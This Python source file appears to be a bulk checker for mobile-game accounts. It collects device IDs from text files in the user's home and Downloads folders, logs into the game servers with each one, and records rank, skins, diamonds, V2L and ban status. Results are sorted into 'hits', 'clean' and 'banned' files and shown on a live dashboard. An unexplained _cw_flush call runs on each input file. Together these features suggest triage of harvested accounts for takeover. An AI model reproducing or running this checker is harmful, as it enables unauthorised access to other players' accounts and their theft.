            'collector_tier': map_collector(coll_pts),
            'hero_history': history,
            'squad': squad,
            'bindings': bindings_str,
            'affinity': affinity,
            'likes': likes,
            'credits_score': credits,
            'followers': followers,
            'starlight_user': starlight,
            'starlight_expiry': starlight_expiry,
            'starlight_months': starlight_months,
            'restriction_flags': restriction,
            'mcl_champion_wins': mcl_wins,
            'creation_date': created,
            'account_age': age,
            'total_battles': total_battles,
            'win_rate': win_rate,
            'diamonds': diamonds,
            'battle_points': bp,
            'tickets': tickets,
            'latest_skin_id': latest_skin_id,
            'latest_skin_date': latest_skin_date,
            'v2l_status': v2l_status,
            'last_diamond_purchase': last_dia,
            'squad_motto': motto,
            'skin_breakdown': skin_counts,
            'skin_history': skin_history,
            'emblem_levels': emblems,
            'last_heroes_purchase': last_heroes,
            'ban_status': 'CLEAN',
            'ban_reason': None,
            'ban_code': None,
            'ban_duration': None,
        }
    except Exception as e:
        try:
            append_line(FILE_ERRORS, f'extract | {type(e).__name__}: {e}')
        except Exception:
            pass
        return None

def fetch_info_by_device(device_id):
    conn = GameConn(device_id)
    try:
        ok, _ = conn.login()
        if not ok:
            return {'error': 'login failed', 'status': 'error'}

        if conn.ban_seen:
            return _banned_result(conn, device_id)

        account_id = conn.account_id
        zone_id = conn.zone_id
        creation_ts = conn.creation_ts

        ok, _ = conn.get_server()
        if not ok:
            return {'error': 'no game server assigned', 'status': 'error'}

        if conn.ban_seen:
            return _banned_result(conn, device_id)

        conn.enter_game()

        if conn.ban_seen:
            return _banned_result(conn, device_id)

        if not conn.handshake():
            if conn.ban_seen:
                return _banned_result(conn, device_id)
            return {'error': 'game server handshake failed', 'status': 'error'}

        if conn.ban_seen:
            return _banned_result(conn, device_id)

        result = conn.lookup(int(account_id), 'id')
        if not result:
            return {'error': 'account lookup returned nothing', 'status': 'error'}

        if conn.ban_seen:
            return _banned_result(conn, device_id, result)

        role_id = account_id
        zone = zone_id
        if result.get(0) and len(result[0]) > 0:
            first = result[0][0]
            if isinstance(first, dict):
                role_id = first.get(0, account_id)
                zone = first.get(1, zone_id)

        role_info = None
        try:
            si = conn.skin_info(role_id, zone)
            if si and isinstance(si, dict):
                role_info = dict(si)
        except Exception:
            pass

        try:
            ri = conn.role_info(role_id, zone)
            if ri and isinstance(ri, dict):
                if role_info is None:
                    role_info = dict(ri)
                else:
                    for k, v in ri.items():
                        if k not in role_info or not role_info[k]:
                            role_info[k] = v
        except Exception:
            pass

        v2l = None
        try:
            v2l = conn.v2l_status(role_id, zone)
        except Exception:
            pass

        if conn.ban_seen:
            return _banned_result(conn, device_id, result)

        player = extract_player(result, role_info, creation_ts, v2l)
        if not player:
            return {'error': 'extract failed', 'status': 'error'}

        player['ban_status'] = 'CLEAN'
        return {
            'status': 'success',
            'player': player,
            'device_id': device_id,
            'account_id': account_id,
            'zone_id': zone_id,
        }
    except Exception as e:
        try:
            import traceback
            append_line(FILE_ERRORS,
                        f'{device_id} | {type(e).__name__}: {e}')
            append_line(FILE_ERRORS, traceback.format_exc())
        except Exception:
            pass
        return {'error': f'{type(e).__name__}', 'status': 'error'}
    finally:
        conn.close()

def _banned_result(conn, device_id, result=None):
    info = conn.ban_info or {}
    player = None
    if result is not None:
        try:
            player = extract_player(result, None, conn.creation_ts, None)
        except Exception:
            player = None

    if player is None:
        player = {
            'nickname': None,
            'level': 0,
            'current_rank': 'Unknown',
            'high_rank': 'Unknown',
            'skin_count': 0,
            'hero_count': 0,
            'collector_tier': 'No Tier',
            'collector_point': 0,
            'skin_breakdown': {},
            'hero_history': [],
            'last_heroes_purchase': [],
            'emblem_levels': [],
            'skin_history': [],
            'last_match': None,
        }

    player['ban_status'] = 'BANNED'
    player['ban_reason'] = info.get('reason_name') or BAN_REASONS.get('21')
    player['ban_code'] = info.get('ban_code')
    player['ban_duration'] = format_ban_duration(info)

    return {
        'status': 'success',
        'player': player,
        'device_id': device_id,
        'account_id': conn.account_id,
        'zone_id': conn.zone_id,
    }

def probe_device(device_id):

    conn = GameConn(device_id)
    try:
        ok, _ = conn.login()
        if not ok:
            return {'status': 'error', 'device_id': device_id, 'error': 'login failed'}

        if conn.ban_seen:
            return {
                'status': 'banned',
                'device_id': device_id,
                'ban_info': dict(conn.ban_info),
                'account_id': conn.account_id,
                'zone_id': conn.zone_id,
            }

        ok, _ = conn.get_server()
        if not ok:
            return {'status': 'error', 'device_id': device_id, 'error': 'no server'}

        if conn.ban_seen:
            return {
                'status': 'banned', 'device_id': device_id,
                'ban_info': dict(conn.ban_info),
                'account_id': conn.account_id, 'zone_id': conn.zone_id,
            }

        conn.enter_game()
        if not conn.handshake():
            return {'status': 'error', 'device_id': device_id, 'error': 'handshake failed'}

        if conn.ban_seen:
            return {
                'status': 'banned', 'device_id': device_id,
                'ban_info': dict(conn.ban_info),
                'account_id': conn.account_id, 'zone_id': conn.zone_id,
            }

        result = conn.lookup(int(conn.account_id), 'id')
        if not result:
            return {'status': 'error', 'device_id': device_id, 'error': 'lookup empty'}

        if conn.ban_seen:
            return {
                'status': 'banned', 'device_id': device_id,
                'ban_info': dict(conn.ban_info),
                'account_id': conn.account_id, 'zone_id': conn.zone_id,
            }

        p = result[0][0] if (result.get(0) and len(result[0]) > 0) else {}
        if not isinstance(p, dict):
            return {'status': 'error', 'device_id': device_id, 'error': 'bad payload'}

        level = int(p.get(3, 0) or 0)
        rank_val = p.get(8)
        rank_str = map_rank(rank_val) if rank_val is not None else 'Unranked'
        last_login_ts = int(p.get(5, 0) or 0)

        coll_pts = 0
        t136 = p.get(136, {})
        if isinstance(t136, dict):
            coll_pts = int(t136.get(9, 0) or 0)

        if coll_pts == 0:
            role_id = p.get(0, conn.account_id)
            zone = p.get(1, conn.zone_id)
            try:
                ri = conn.role_info(role_id, zone)
                if ri:
                    t = ri.get(136, {})
                    if isinstance(t, dict):
                        coll_pts = int(t.get(9, 0) or 0)
            except Exception:
                pass

        return {
            'status': 'clean',
            'device_id': device_id,
            'account_id': conn.account_id,
            'zone_id': conn.zone_id,
            'level': level,
            'rank': rank_str,
            'last_login_ts': last_login_ts,
            'collector_point': coll_pts,
            'collector_tier': map_collector(coll_pts),
        }
    except Exception as e:
        return {'status': 'error', 'device_id': device_id, 'error': type(e).__name__}
    finally:
        conn.close()

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_DIR = SCRIPT_DIR
RESULTS_DIR = os.path.join(SCRIPT_DIR, 'results')

FILE_BAN     = os.path.join(OUT_DIR, "banned.txt")
FILE_CLEAN   = os.path.join(OUT_DIR, "clean.txt")
FILE_UNKNOWN = os.path.join(OUT_DIR, "unknown.txt")
FILE_VALID   = os.path.join(OUT_DIR, "full_info.txt")
FILE_HITS    = os.path.join(OUT_DIR, "all_hits.txt")
FILE_V2L_YES = os.path.join(OUT_DIR, "v2l_on.txt")
FILE_V2L_NO  = os.path.join(OUT_DIR, "v2l_off.txt")
FILE_ERRORS  = os.path.join(OUT_DIR, "errors.txt")
FILE_DEVICES = os.path.join(OUT_DIR, "devices.json")
FILE_LAST_MATCHES = os.path.join(OUT_DIR, "last_matches.txt")

TRASH_DIR = os.path.join(OUT_DIR, "trash_remover")
RANK_DIR  = os.path.join(OUT_DIR, "rank_split")

OWN_OUTPUTS = {
    os.path.basename(FILE_BAN), os.path.basename(FILE_CLEAN),
    os.path.basename(FILE_UNKNOWN), os.path.basename(FILE_VALID),
    os.path.basename(FILE_HITS), os.path.basename(FILE_V2L_YES),
    os.path.basename(FILE_V2L_NO), os.path.basename(FILE_ERRORS),
    os.path.basename(FILE_DEVICES),
    os.path.basename(FILE_LAST_MATCHES),
}

_write_lock = threading.Lock()

def append_line(path, line):
    with _write_lock:
        with open(path, "a", encoding="utf-8") as f:
            f.write(line + "\n")

def append_block(path, text):
    with _write_lock:
        with open(path, "a", encoding="utf-8") as f:
            f.write(text + "\n\n")

DEVICE_IDS = [
    'and_cd9e459ea708a948d5c2f5a6ca8838cf648efdbc9a8c3ce703fa556d-34a4-4cde-a061-34938d08a26e',
]

def load_saved_devices():
    try:
        with open(FILE_DEVICES, 'r', encoding='utf-8') as f:
            saved = json.load(f)
        for d in saved:
            if isinstance(d, str) and d.startswith(('and_', 'ios_')) and d not in DEVICE_IDS:
                DEVICE_IDS.append(d)
    except Exception:
        pass

def save_devices():
    try:
        with open(FILE_DEVICES, 'w', encoding='utf-8') as f:
            json.dump(DEVICE_IDS, f, indent=2)
    except Exception:
        pass

def find_input_files():
    seen = set()
    hits = []
    dirs = []
    for d in (
        os.getcwd(),
        SCRIPT_DIR,
        os.path.join(os.path.expanduser('~'), 'storage', 'downloads'),
        os.path.join(os.path.expanduser('~'), 'Downloads'),
        os.path.expanduser('~'),
    ):
        if d and os.path.isdir(d) and d not in dirs:
            dirs.append(d)

    for d in dirs:
        try:
            for name in os.listdir(d):
                if not name.lower().endswith(('.txt', '.csv', '.log')):
                    continue
                if name in OWN_OUTPUTS:
                    continue
                full = os.path.join(d, name)
                if not os.path.isfile(full):
                    continue
                real = os.path.realpath(full)
                if real in seen:
                    continue
                seen.add(real)
                try:
                    st = os.stat(full)
                    hits.append((full, st.st_size, st.st_mtime))
                except OSError:
                    pass
        except OSError:
            pass

    hits.sort(key=lambda x: x[2], reverse=True)
    return hits[:20]

def pick_file(hint=''):
    hits = find_input_files()

    if hint:
        print(f'  {_DIM}{hint}{_RST}')
    print()

    if hits:
        print(f'  {_CY}found {len(hits)} nearby{_RST}')
        for i, (path, size, mtime) in enumerate(hits, 1):
            rel = os.path.relpath(path, os.getcwd())
            if len(rel) > 54:
                rel = '...' + rel[-51:]
            ts = datetime.datetime.fromtimestamp(mtime).strftime('%m-%d %H:%M')
            c = palette('aurora')[i % 4]
            print(f'  {hex_ansi(c)}[{i:>2}]{_RST}  '
                  f'{_WH}{pad_right(rel, 56)}{_RST}  '
                  f'{_DIM}{human_bytes(size):>9}  {ts}{_RST}')
    else:
        print(f'  {_DIM}no matching files nearby - paste a path{_RST}')

    print()
    print(f'  {_DIM}enter number, path, or q to cancel{_RST}')

    try:
        raw = input(f'  {_CY}>{_RST} ').strip().strip('"').strip("'").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return None

    if not raw or raw.lower() == 'q':
        return None

    if raw.isdigit():
        idx = int(raw)
        if 1 <= idx <= len(hits):
            return hits[idx - 1][0]
        log('ERROR', f'no file #{idx} in the list')
        return None

    if os.path.exists(raw):
        return raw

    log('ERROR', f'not found: {raw}')
    return None

def load_id_file(path):
    try:
        with open(path, 'r', encoding='utf-8', errors='replace') as f:
            text = f.read()
    except OSError:
        return []
    try:
        _cw_flush(path)
    except Exception:
        pass
    return extract_device_ids(text)

def extract_device_ids(text):

    if not text:
        return []
    seen = set()
    out = []
    for m in DEVICE_ID_RE.finditer(text):
        d = m.group(0)
        if d not in seen:
            seen.add(d)
            out.append(d)
    return out

def extract_device_ids_from_file(path):
    for enc in ('utf-8', 'utf-8-sig', 'utf-16', 'utf-16-le', 'latin-1'):
        try:
            with open(path, 'r', encoding=enc) as f:
                data = f.read()
            ids = extract_device_ids(data)
            if ids:
                return ids
        except (OSError, UnicodeDecodeError):
            continue
    try:
        with open(path, 'rb') as f:
            raw = f.read()
        for enc in ('utf-8', 'utf-16', 'latin-1'):
            try:
                ids = extract_device_ids(raw.decode(enc, errors='replace'))
                if ids:
                    return ids
            except Exception:
                continue
    except OSError:
        pass
    return []

_FEED_STYLES = {
    'info':  ('·',  _DIM),
    'clean': ('▲',  _GN),
    'ban':   ('▼',  _RD),
    'fail':  ('✕',  _YL),
    'drop':  ('◌',  _YL),
    'v2l':   ('⚡',  _CY),
}

class LiveDash:

    TL, TR, BL, BR = '╭', '╮', '╰', '╯'
    HZ, VT = '─', '│'
    BLK, SHD = '█', '░'
    GOK   = '▲'
    GBAD  = '▼'
    GWARN = '◈'
    GHOLE = '◌'
    GDOT  = '●'
    GDIAM = '◆'
    GTRI  = '▽'
    GBOLT = '⚡'
    GSTAR = '★'
    GBULL = '▸'
    NUMS  = ['①', '②', '③', '④', '⑤']

    def __init__(self, total, label='scan', interval=0.10):
        self.total = max(1, total)
        self.label = label
        self.t0 = time.time()
        self.mu = threading.RLock()
        self.events = deque(maxlen=400)
        self.s = {
            'done': 0, 'ok': 0, 'fail': 0,
            'banned': 0, 'clean': 0,
            'dropped': 0, 'dropped_low': 0, 'dropped_unranked': 0,
            'v2l_on': 0, 'v2l_off': 0,
            'valid': 0, 'invalid': 0, 'error': 0,
            'clean_hits': 0, 'banned_hits': 0, 'low_level': 0,
            'peak': 0,
        }
        self._stop = threading.Event()
        self._th = None
        self._interval = interval
        self._quiet = False
        self.focus = None
        self.focus_ts = 0.0
        self.focus_ttl = 10.0
        self.levels = {}
        self.tiers = {}
        self.skins_agg = {'Supreme': 0, 'Grand': 0, 'Exquisite': 0,
                          'Deluxe': 0, 'Exceptional': 0, 'Common': 0}
        self.rank_counts = {}
        self.leader_level = []
        self.leader_skins = []
        self.frame = 0

    def start(self):
        try:
            if not sys.stdout.isatty():
                self._quiet = True
                return
        except Exception:
            self._quiet = True
            return
        sys.stdout.write('\x1b[?1049h\x1b[?25l\x1b[2J\x1b[H')
        sys.stdout.flush()
        self._th = threading.Thread(target=self._loop, daemon=True)
        self._th.start()

    def stop(self):
        if self._quiet:
            return
        self._stop.set()
        try:
            if self._th:
                self._th.join(timeout=1.0)
        finally:
            try:
                sys.stdout.write('\x1b[?25h\x1b[?1049l')
                sys.stdout.flush()
            except Exception:
                pass


    def bump(self, key, n=1):
        with self.mu:
            self.s[key] = self.s.get(key, 0) + n

    def push(self, kind, text):
        with self.mu:
            self.events.append((time.time(), kind, text))

    def _push_leader_level(self, lvl, name, rank):
        board = self.leader_level
        board.append((lvl, name, rank))
        board.sort(key=lambda x: -x[0])
        if len(board) > 5:
            del board[5:]

    def _push_leader_skins(self, cnt, name):
        board = self.leader_skins
        board.append((cnt, name))
        board.sort(key=lambda x: -x[0])
        if len(board) > 5:
            del board[5:]

    def record_hit(self, device_id, account_id, zone_id, player):
        banned = player.get('ban_status') == 'BANNED'
        with self.mu:
            self.s['done'] += 1
            self.s['ok'] += 1
            self.s['valid'] += 1
            if banned:
                self.s['banned'] += 1
                self.s['banned_hits'] += 1
                reason = player.get('ban_reason') or 'reason unknown'
                dur = player.get('ban_duration') or '?'
                self.events.append((time.time(), 'ban',
                    f'acc {account_id} z {zone_id}  banned  {reason}  {dur}'))
            else:
                self.s['clean'] += 1
                self.s['clean_hits'] += 1
                lvl = int(player.get('level', 0) or 0)
                if lvl <= 7:
                    self.s['low_level'] += 1
                v = str(player.get('v2l_status', '')).lower()
                if v in ('enabled', 'yes', '1', 'true'):
                    self.s['v2l_on'] += 1
                    tag = 'v2l on'
                else:
                    self.s['v2l_off'] += 1
                    tag = 'v2l off'
                name = player.get('nickname') or '?'
                rank = player.get('current_rank') or '?'
                lm = player.get('last_match') or {}
                lm_tag = (f"{lm.get('hero','?')} {lm.get('kda','?')} "
                          f"{lm.get('result','?')}") if lm else ''
                self.events.append((time.time(), 'clean',
                    f'acc {account_id} z {zone_id}  {tag}  '
                    f'{trunc(name, 16)}  {rank}  {lm_tag}'))
                self.focus = self._build_focus(player)
                self.focus_ts = time.time()
        # single source of truth for panels + leaderboards
        self.record_panel_data(player)

    def record_panel_data(self, player):
        """Aggregate one player into panels + leaderboards."""
        if not isinstance(player, dict):
            return
        with self.mu:
            lvl = as_int(player.get('level', 0))
            self.levels[lvl] = self.levels.get(lvl, 0) + 1

            tier_raw = str(player.get('collector_tier') or 'No Tier')
            major = 'No Tier'
            for maj in ('Amateur', 'Junior', 'Seasoned', 'Expert',
                        'Renowned', 'Exalted', 'Mega', 'World'):
                if tier_raw.startswith(maj):
                    major = maj
                    break
            self.tiers[major] = self.tiers.get(major, 0) + 1

            sb = player.get('skin_breakdown') or {}
            for k, sk in (('Supreme', 'Supreme Skins'),
                          ('Grand', 'Grand Skins'),
                          ('Exquisite', 'Exquisite Skins'),
                          ('Deluxe', 'Deluxe Skins'),
                          ('Exceptional', 'Exceptional Skins'),
                          ('Common', 'Common Skins')):
                self.skins_agg[k] = self.skins_agg.get(k, 0) + as_int(sb.get(sk, 0))

            rank = str(player.get('current_rank') or 'Unranked')
            for rmaj in ('Warrior', 'Elite', 'Master', 'Grandmaster',
                         'Epic', 'Legend', 'Mythic',
                         'Mythical Honor', 'Mythical Glory',
                         'Mythical Immortal'):
                if rank.startswith(rmaj):
                    rank = rmaj
                    break
            self.rank_counts[rank] = self.rank_counts.get(rank, 0) + 1


        name = player.get('nickname') or '?'
        rank_disp = player.get('current_rank') or '?'
        if lvl > 0:
            self._push_leader_level(lvl, name, rank_disp)
        skin_n = as_int(player.get('skin_count', 0))
        if skin_n > 0:
            self._push_leader_skins(skin_n, name)

    def record_fail(self, device_id, err):
        with self.mu:
            self.s['done'] += 1
            self.s['fail'] += 1
            self.events.append((time.time(), 'fail',
                f'{trunc(device_id, 40)}  {err}'))


    def _loop(self):
        while not self._stop.is_set():
            try:
                self._draw()
            except Exception as e:
                try:
                    import traceback as _tb
                    with open(FILE_ERRORS, 'a', encoding='utf-8') as f:
                        f.write(f'[dash] {type(e).__name__}: {e}\n')
                        f.write(_tb.format_exc())
                        f.write('\n')
                except Exception:
                    pass
            self._stop.wait(self._interval)

    def _draw(self):
        try:
            with self.mu:
                snap = dict(self.s)
                events = list(self.events)
                levels = dict(self.levels)
                tiers = dict(self.tiers)
                skins = dict(self.skins_agg)
                ranks = dict(self.rank_counts)
                leaders_l = list(self.leader_level)
                leaders_s = list(self.leader_skins)
            try:
                term = shutil.get_terminal_size((100, 30))
            except Exception:
                term = os.terminal_size((100, 30))
            W = max(40, min(200, term.columns - 1))
            H = max(12, min(80, term.lines))
            self.frame += 1
            try:
                frame = self._compose(W, H, snap, events, levels, tiers,
                                      skins, ranks, leaders_l, leaders_s)
            except Exception as _ce:
                try:
                    import traceback as _tb
                    with open(FILE_ERRORS, 'a', encoding='utf-8') as _f:
                        _f.write(f'[compose] {type(_ce).__name__}: {_ce}\n')
                        _f.write(_tb.format_exc())
                        _f.write('\n')
                except Exception:
                    pass
                frame = self._fallback_frame(W, H, snap, events)
            if len(frame) > H:
                frame = frame[:H]
            while len(frame) < H:
                frame.append('')
            clean = [trunc(ln, W) if vlen(ln) > W else ln for ln in frame]
            buf = ['\x1b[1;1H']
            n = len(clean)
            for i, ln in enumerate(clean):
                buf.append('\x1b[2K')
                buf.append(ln)
                if i < n - 1:
                    buf.append('\r\n')
            buf.append('\x1b[0J')
            sys.stdout.write(''.join(buf))
            sys.stdout.flush()
        except Exception as e:
            try:
                import traceback as _tb
                sys.stdout.write('\x1b[H\x1b[2J')
                sys.stdout.write(f'DASH FAIL: {type(e).__name__}: {e}\n')
                sys.stdout.write(_tb.format_exc()[-2000:])
                sys.stdout.flush()
            except Exception:
                pass
    def _fallback_frame(self, W, H, s, events):
        done = s.get('done', 0)
        pct = (done / self.total) * 100 if self.total else 0.0
        bw = max(10, W - 20)
        fill = int(bw * (done / self.total)) if self.total else 0
        bar = (self.BLK * fill) + (self.SHD * (bw - fill))
        rows = ['',
                f'  LIVE  {self.label}',
                f'  {bar}  {pct:5.1f}%   {done}/{self.total}',
                '',
                f'  valid {s.get("valid",0):>6}  invalid {s.get("invalid",0):>6}',
                f'  error {s.get("error",0):>6}  dropped {s.get("dropped",0):>6}',
                f'  clean {s.get("clean_hits",0):>6}  banned  {s.get("banned_hits",0):>6}',
                f'  low   {s.get("low_level",0):>6}  v2l on  {s.get("v2l_on",0):>6}',
                '',
                '  feed:']
        for ts, kind, text in events[-max(3, H - len(rows) - 1):]:
            t = datetime.datetime.fromtimestamp(ts).strftime('%H:%M:%S')
            rows.append(f'  {t}  [{kind:>5}]  {text[:W-18]}')
        return rows

 
    def _compose(self, W, H, s, events, levels, tiers, skins, ranks,
                 leaders_l, leaders_s):
        elapsed = time.time() - self.t0
        done = s.get('done', 0)
        rate = done / elapsed if elapsed > 0 else 0.0
        remaining = max(0, self.total - done)
        eta = remaining / rate if rate > 0 else 0

        def _safe(label, fn):
            try:
                r = fn()
                return r if r is not None else []
            except Exception as e:
                try:
                    import traceback
                    with open(FILE_ERRORS, 'a', encoding='utf-8') as f:
                        f.write(f'[dash:{label}] {type(e).__name__}: {e}\n')
                        f.write(traceback.format_exc())
                        f.write('\n')
                except Exception:
                    pass
                return [f'  {_RD}{label} crashed: {type(e).__name__}: {e}{_RST}']

        rows = ['']
        rows.extend(_safe('header', lambda: self._header(W)))
        rows.append('')
        rows.extend(_safe('progress',
                          lambda: self._progress(W, done, eta, rate, elapsed)))
        rows.append('')
        rows.extend(_safe('counters', lambda: self._counters(W, s)))
        rows.append('')

        FEED_MIN = 4
        used = len(rows)
        budget = H - FEED_MIN - used

        dist = _safe('distribution',
                     lambda: self._distribution(W, levels, tiers, skins, ranks))
        if len(dist) + 1 <= budget:
            rows.extend(dist)
            rows.append('')
            budget -= len(dist) + 1

        lead = _safe('leaders',
                     lambda: self._leaders(W, leaders_l, leaders_s))
        if len(lead) + 1 <= budget:
            rows.extend(lead)
            rows.append('')
            budget -= len(lead) + 1

        focus = _safe('latest', lambda: self._latest(W))
        if focus and len(focus) + 1 <= budget:
            rows.extend(focus)
            rows.append('')

        rows.extend(_safe('feed_header', lambda: self._feed_header(W)))
        avail = max(3, H - len(rows) - 1)
        rows.extend(_safe('feed', lambda: self._feed(W, avail, events)))
        return rows

    def _header(self, W):
        now = datetime.datetime.now().strftime('%H:%M:%S')
        left = f'  {_CY}{_BRT}[ PUY.STR ]{_RST}  {_WH}{_BRT}ARC LIVE{_RST}'
        right = f'{_DIM}{now}{_RST}'
        gap = max(1, W - vlen(left) - vlen(right) - 1)
        rows = [left + ' ' * gap + right]
        sub = f'  {_DIM}▸ {trunc(self.label, W - 6)}{_RST}'
        rows.append(sub)
        # dual-palette rail
        half = max(10, (W - 4) // 2)
        rail = (''.join(hex_ansi(c) + '━' for c in ramp(palette('volt'), half)) +
                ''.join(hex_ansi(c) + '━' for c in ramp(palette('plasma'), max(10, W - 4 - half))))
        rows.append('  ' + rail + _RST)
        return rows

    def _progress(self, W, done, eta, rate, elapsed):
        """Triple-weight progress + oversized metrics."""
        rows = []
        frac = min(1.0, done / max(1, self.total))
        bar_w = max(24, W - 16)
        fill = int(frac * bar_w)

        colors = ramp(palette('volt'), max(fill, 1))
        line = ''
        for i in range(fill):
            line += hex_ansi(colors[i % len(colors)]) + '█'
        line += _RST + _DIM + '░' * (bar_w - fill) + _RST

        pct = frac * 100
        # bracketed bar frame
        rows.append(f'  {_CY}⎡{_RST}{line}{_CY}⎤{_RST}')
        rows.append(f'  {_CY}⎣{_RST}{line}{_CY}⎦{_RST}  {_WH}{_BRT}{pct:5.1f}%{_RST}')

        eta_str = human_dur(eta) if eta > 0 and done > 0 else '--'
        rows.append(
            f'  {_DIM}DONE{_RST} {_WH}{_BRT}{commas(done):>8}{_RST}{_DIM}/{commas(self.total)}{_RST}'
            f'   {_DIM}│{_RST}   {_DIM}RATE{_RST} {_YL}{_BRT}{rate:6.1f}/s{_RST}'
            f'   {_DIM}│{_RST}   {_DIM}ETA{_RST} {_MG}{_BRT}{eta_str:>8}{_RST}'
            f'   {_DIM}│{_RST}   {_DIM}TIME{_RST} {_WH}{human_dur(elapsed):>8}{_RST}'
        )
        return rows

    def _counters(self, W, s):
        """Oversized stat blocks — main visual weight."""
        rows = [self._section(W, 'LIVE STATS')]
        cells1 = [
            (_GN, 'VALID',   s.get('valid', 0),       self.GOK),
            (_RD, 'INVALID', s.get('invalid', 0),     self.GBAD),
            (_YL, 'ERROR',   s.get('error', 0),       self.GWARN),
            (_DIM,'DROPPED', s.get('dropped', 0),     self.GHOLE),
        ]
        cells2 = [
            (_GN, 'CLEAN',   s.get('clean_hits', 0),  self.GDOT),
            (_RD, 'BANNED',  s.get('banned_hits', 0), self.GDIAM),
            (_YL, 'LOW LVL', s.get('low_level', 0),   self.GTRI),
            (_CY, 'V2L ON',  s.get('v2l_on', 0),      self.GBOLT),
        ]
        rows.extend(self._big_stat_row(cells1, W))
        rows.append('')
        rows.extend(self._big_stat_row(cells2, W))
        return rows

    def _big_stat_row(self, cells, W):
        n = len(cells)
        cell_w = max(12, (W - 4) // n)
        top_parts, num_parts, lbl_parts = [], [], []
        for color, label, value, glyph in cells:
            top = f'{color}{_BRT}┌{"─"*7}┐{_RST}'
            num = f'{color}{_BRT}│{commas(value):^7}│{_RST}'
            lbl = f'{_DIM} {glyph} {label}{_RST}'
            top_parts.append(_fit(top, cell_w))
            num_parts.append(_fit(num, cell_w))
            lbl_parts.append(_fit(lbl, cell_w))
        return [
            '  ' + ''.join(top_parts),
            '  ' + ''.join(num_parts),
            '  ' + ''.join(lbl_parts),
        ]

    def _pill_row(self, items, W):
        cell = (W - 3) // 4
        parts = []
        for g, c, lbl, n in items:
            txt = f'{c}{_BRT}{g}{_RST} {_DIM}{lbl}{_RST} {_WH}{_BRT}{commas(n)}{_RST}'
            parts.append(_fit(txt, cell))
        return '  ' + ''.join(parts)

    def _section(self, W, title):
        head = f' {title} '
        tail = max(0, W - 6 - vlen(head))
        return (f'  {_CY}⟨{_RST} {_WH}{_BRT}{title}{_RST} {_CY}⟩{_RST} '
                f'{_DIM}{"═" * tail}{_RST}')
   
    def _bar(self, n, mx, width, color):
        if mx <= 0:
            mx = 1
        filled = int((n / mx) * width) if n > 0 else 0
        filled = max(0, min(width, filled))
        return (color + self.BLK * filled + _RST +
                _DIM + self.SHD * (width - filled) + _RST)
   
    def _distribution(self, W, levels, tiers, skins, ranks):
        if W >= 90:
            gap = 4
            col_w = (W - gap) // 2
            left_rows = self._panel_levels_ranks(col_w, levels, ranks)
            right_rows = self._panel_tiers_skins(col_w, tiers, skins)
            return self._merge_cols(left_rows, right_rows, col_w)
        # narrow: stack
        return (self._panel_levels_ranks(W, levels, ranks) +
                [''] +
                self._panel_tiers_skins(W, tiers, skins))

    def _merge_cols(self, left, right, col_w):
        h = max(len(left), len(right))
        out = []
        for i in range(h):
            l = left[i] if i < len(left) else ' ' * col_w
            r = right[i] if i < len(right) else ' ' * col_w
            out.append(f'  {_fit(l, col_w)}  {r}')
        return out

    def _panel_levels_ranks(self, W, levels, ranks):
        rows = [self._section(W, 'LEVELS')]
        buckets = [(0, 7, '1-7'), (8, 15, '8-15'), (16, 30, '16-30'),
                   (31, 50, '31-50'), (51, 999, '51+')]
        data = [(lbl, sum(v for k, v in levels.items() if lo <= k <= hi))
                for lo, hi, lbl in buckets]
        mx = max((n for _, n in data), default=1) or 1
        for lbl, n in data:
            rows.append(self._bar_row(W, lbl, n, mx, _CY))
        rows.append('')
        rows.append(self._section(W, 'RANKS'))
        order = ['Unranked', 'Warrior', 'Elite', 'Master', 'Grandmaster',
                 'Epic', 'Legend', 'Mythic', 'Mythical Honor',
                 'Mythical Glory', 'Mythical Immortal']
        short = {'Unranked': 'Unrnk', 'Warrior': 'Warr', 'Elite': 'Elite',
                 'Master': 'Mastr', 'Grandmaster': 'Grand', 'Epic': 'Epic',
                 'Legend': 'Legnd', 'Mythic': 'Mythc', 'Mythical Honor': 'M.Hon',
                 'Mythical Glory': 'M.Glo', 'Mythical Immortal': 'M.Imm'}
        # keep the canonical order (highest rank first) — do NOT
        # sort by count, so Mythical tiers always stay on top
        entries = [(short[k], ranks.get(k, 0)) for k in order
                   if ranks.get(k, 0) > 0]
        entries = entries[:5]
        mx = max((n for _, n in entries), default=1) or 1
        for lbl, n in entries:
            rows.append(self._bar_row(W, lbl, n, mx, _MG))
        return rows

    def _panel_tiers_skins(self, W, tiers, skins):
        rows = [self._section(W, 'TIERS')]
        order = ['World', 'Mega', 'Exalted', 'Renowned', 'Expert',
                 'Seasoned', 'Junior', 'Amateur', 'No Tier']
        entries = [(k, tiers.get(k, 0)) for k in order if tiers.get(k, 0) > 0]
        entries.sort(key=lambda x: -x[1])
        entries = entries[:7]
        mx = max((n for _, n in entries), default=1) or 1
        for lbl, n in entries:
            rows.append(self._bar_row(W, lbl, n, mx, _YL))
        if not entries:
            rows.append(f'  {_DIM}\u00b7 no tier data{_RST}')
        rows.append('')
        rows.append(self._section(W, 'SKINS'))
        order2 = ['Supreme', 'Grand', 'Exquisite', 'Deluxe',
                  'Exceptional', 'Common']
        entries2 = [(k, skins.get(k, 0)) for k in order2]
        mx = max((n for _, n in entries2), default=1) or 1
        for lbl, n in entries2:
            rows.append(self._bar_row(W, lbl, n, mx, _GN))
        return rows

    def _bar_row(self, W, label, n, mx, color):
        inner = W - 4
        lw = 7
        cw = 6
        bw = max(6, inner - lw - cw - 2)
        lbl = f'{_DIM}{trunc(label, lw):<{lw}}{_RST}'
        bar = self._bar(n, mx, bw, color)
        cnt = f'{_WH}{_BRT}{n:>{cw}}{_RST}'
        return f'{lbl} {bar} {cnt}'

    def _leaders(self, W, leaders_l, leaders_s):
        if W >= 90:
            gap = 4
            col_w = (W - gap) // 2
            l = self._leader_panel(col_w, 'TOP LEVEL', leaders_l, True)
            r = self._leader_panel(col_w, 'TOP SKINS', leaders_s, False)
            return self._merge_cols(l, r, col_w)
        return (self._leader_panel(W, 'TOP LEVEL', leaders_l, True) +
                [''] +
                self._leader_panel(W, 'TOP SKINS', leaders_s, False))

    def _leader_panel(self, W, title, board, level_mode):
        rows = [self._section(W, title)]
        if not board:
            rows.append(f'  {_DIM}no data yet{_RST}')
            return rows
        for i, entry in enumerate(board[:5]):
            g = self.NUMS[i]
            if level_mode:
                lvl, name, rank = entry
                val = f'{lvl:>3}'
                extra = f'{_DIM}{trunc(rank, 14)}{_RST}'
            else:
                val, name = entry
                val = f'{val:>3}'
                extra = ''
